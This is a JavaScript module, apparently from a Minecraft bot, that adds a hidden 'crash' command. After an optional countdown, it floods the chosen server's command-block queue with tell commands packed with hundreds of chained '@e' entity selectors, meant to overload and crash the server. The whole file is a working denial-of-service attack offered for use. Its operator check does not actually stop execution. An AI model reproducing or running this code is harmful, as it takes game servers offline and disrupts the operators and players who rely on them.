const index=require("../../index.js");
const cc=require("../commandblock.js");
module.exports={
	command:function(b,msg,sender,username,verify){
		const args=msg.split(" ");
		if(!verify && args.length>=2){
			b.send("This command is not able to select a server, unless being run from console.")
			return;
		}
		let server;
		if(args.length>=2){
			server=+args[1];
		} else {
			server=0;
		}
		if(index.bots[server].o.partial_op || index.bots[server].o.deop){
			b.send("Operator access is required to crash server "+server+".")
		}
		let delay;
		if(args[2]!=="silent"){
			delay=3000;
			setTimeout(()=>{
				index.bots[server].send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 3")
				if(b.id!=server){
					b.send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 3")
				}
			},0)
			setTimeout(()=>{
				index.bots[server].send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 2")
				if(b.id!=server){
					b.send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 2")
				}
			},1000)
			setTimeout(()=>{
				index.bots[server].send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 1")
				if(b.id!=server){
					b.send("Crashing "+index.bots[server].host+":"+index.bots[server].port+" in 1")
				}
			},2000)
		} else {
			delay=500;
		}
		setTimeout(()=>{
			const array=new Array(700).fill("@e[distance =1..2147483647]").join("@e"); 
			const array2=new Array(700).fill("@e").join("@e"); 
			for(let i=0;i<=20;i++){
				index.bots[server].ccq.push('/minecraft:tell @a '+array)
				index.bots[server].ccq.push('/minecraft:tell @a '+array2)
			}
		},delay)
	},
	desc: "Crashes a server",
	usage: " [server]",
	hidden: true
}

